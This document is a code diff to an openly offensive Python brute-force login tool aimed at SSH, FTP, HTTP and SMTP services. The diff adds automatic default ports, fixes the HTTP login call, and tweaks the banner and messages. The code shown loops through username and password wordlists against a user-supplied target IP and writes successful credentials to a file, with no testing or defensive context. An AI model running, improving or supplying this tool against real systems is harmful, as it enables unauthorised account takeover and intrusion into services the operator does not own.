@@ -12,11 +12,11 @@ import os
 
 # Display banner
 print(r"""
-╔════════════════════════════════════════════════════╗
+╔════════════════════════════════════════════════════════════════╗
 ║    🔥 MAYUKH BISWAS - BRUTE FORCE TOOL 🔥          ║
 ║     超本能 | Ultra Instinct Mode: ACTIVATED 🧠      ║
 ║    Protocols: SSH | FTP | HTTP | SMTP              ║
-╚════════════════════════════════════════════════════╝
+╚══════════════════════════════════════════════════════════╝
 """)
 
 time.sleep(1)
@@ -27,8 +27,6 @@ try:
     pygame.mixer.init()
     pygame.mixer.music.load("aisa-mat-karo.mp3")
     pygame.mixer.music.play()
-
-
 except:
     print("[!] Warning: Sound file could not be played.")
 
@@ -43,11 +41,23 @@ time.sleep(1)
 start_time = time.time()
 
 target_ip = input("Enter attack IP: ")
-target_port = int(input("Enter Port No: "))
 protocol = input("Enter protocol type (ssh/ftp/http/smtp): ").lower()
 username_file = input("Enter your username file: ")
 password_file = input("Enter your password file: ")
 timeout_seconds = int(input("Enter your time (seconds): "))
+
+# Automatically assign default port based on protocol
+if protocol == "ssh":
+    target_port = 22
+elif protocol == "ftp":
+    target_port = 21
+elif protocol == "http":
+    target_port = 80
+elif protocol == "smtp":
+    target_port = 587
+else:
+    print("\u274c Unsupported protocol!")
+    exit()
 
 # HTTP specific inputs
 if protocol == "http":
@@ -70,7 +80,7 @@ def try_ssh_login(host, port, username, password):
     except paramiko.AuthenticationException:
         print(f"[SSH FAIL😫] {username}:{password}")
     except Exception as e:
-        print(f"[SSH ERROR👾] {e}")
+        print(f"[SSH ERROR💾] {e}")
     return False
 
 # FTP Login 
@@ -111,13 +121,10 @@ def try_http_login(url, username, password, user_field, pass_field, fail_flag):
             pass_field: password
         }
         r = requests.post(url, data=data, timeout=timeout_seconds)
-        
-        # Check if failure indicator is in the response
         if fail_flag.lower() in r.text.lower():
             print(f"[HTTP FAIL❌] {username}:{password}")
         else:
             print(f"[HTTP LOGIN SUCCESS🔥] {username}:{password}")
-            # Save result to file
             with open("success_logins.txt", "a") as f:
                 f.write(f"HTTP | {username}:{password}\n")
             return True
@@ -147,7 +154,7 @@ def brute_force():
                     if try_smtp_login(target_ip, target_port, username, password):
                         return
                 elif protocol == "http":
-                    if try_http_login(login_url, username, password):
+                    if try_http_login(login_url, username, password, user_field, pass_field, failure_indicator):
                         return
                 else:
                     print(f"❌ Unsupported protocol: {protocol}")
